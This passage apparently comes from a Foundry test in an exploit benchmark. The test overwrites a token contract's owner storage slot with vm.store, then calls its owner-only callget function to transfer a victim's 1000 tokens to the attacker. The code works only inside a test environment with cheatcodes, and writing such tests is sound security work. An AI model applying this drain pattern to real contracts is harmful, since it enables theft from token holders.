        victim = TARGET;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 amount = 1000 ether;

                // Forcefully take ownership by overwriting the _owner storage slot.
                // Based on inheritance order, ERC20 variables occupy slots 0-5.
                // Ownable's _owner variable is next, at slot 6.
                bytes32 ownerSlot = bytes32(uint256(6));
                vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

                // Setup: Use deal() to give the victim a token balance.
                deal(address(token), victim, amount);
                assertEq(token.balanceOf(victim), amount);

                // Exploit: As the new owner (attacker), call callget to steal tokens.
                // No prank is needed as the attacker is now the legitimate owner.
                token.callget(victim, attacker, amount);

                // Oracle will assert that the attacker's balance has increased.
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
